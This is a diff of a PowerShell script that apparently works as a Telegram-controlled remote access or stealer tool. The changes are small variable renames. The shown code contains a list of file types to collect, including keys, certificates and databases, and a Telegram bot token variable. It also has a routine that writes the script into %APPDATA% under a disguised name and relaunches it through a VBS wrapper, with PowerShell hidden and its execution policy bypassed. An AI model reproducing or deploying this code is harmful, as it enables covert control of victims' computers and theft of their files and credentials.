@@ -31,7 +31,7 @@ FILETYPES = log, db, txt, doc, pdf, jpg, jpeg, png, wdoc, xdoc, cer, key, xls, x
 #------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
 # Define User Variables
 $Token = "$tg"  # Your Telegram Token
-$GHurl = "$GH" # Your Url to a textfile (NOT REQUIRED)
+$GHurl = "$gh" # Your Url to a textfile (NOT REQUIRED)
 
 # Define Script Variables
 $killphrase = "True"
@@ -453,16 +453,17 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 
 
 Function PauseSession{
-$newScriptPath2 = "$env:APPDATA\Microsoft\Windows\temp.ps1"
-$scriptContent | Out-File -FilePath $newScriptPath2 -force
+$newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
+sleep 1
+$scriptContent | Out-File -FilePath $newScriptPath -force
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
 '@
-$pth2 = "$env:APPDATA\Microsoft\Windows\temp.vbs"
-$tobat | Out-File -FilePath $pth2 -Force
+$pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
+$tobat | Out-File -FilePath $pth -Force
 sleep 2
-Start-Process -FilePath $pth2
+Start-Process -FilePath $pth
 break
 }
 
